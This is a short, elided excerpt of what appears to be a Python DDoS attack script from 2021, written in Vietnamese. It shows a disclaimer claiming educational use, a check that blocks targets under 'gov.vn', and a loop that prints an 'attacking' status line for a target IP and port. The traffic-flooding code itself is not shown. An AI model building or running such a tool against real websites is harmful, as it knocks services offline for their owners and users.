...
© Copyright 2021 - Bùi Văn Nam          
├─────────────────────────────────────────────────────┤
Tôi không chịu trách nghệm cho mọi hành vi sử dụng không nhằm 
vào việc giáo dục và thử nghiệm 
...
def prevent():
    ...
    if 'gov.vn' in ip :
        print("Bạn không thể tấn công trang web của chính phủ Việt Nam! Protected by Bùi văn Nam- (ndbiaw).")
        exit()
...
while True:
        ...
        try:
            if n>=4:
                n = 0
            time.sleep(0.1)
            sys.stdout.write("["+str(key[n])+"]ĐANG DDOS(tấn công)"+ip+page+":"+str(port)+"\r")
            sys.stdout.flush()
            n +=1
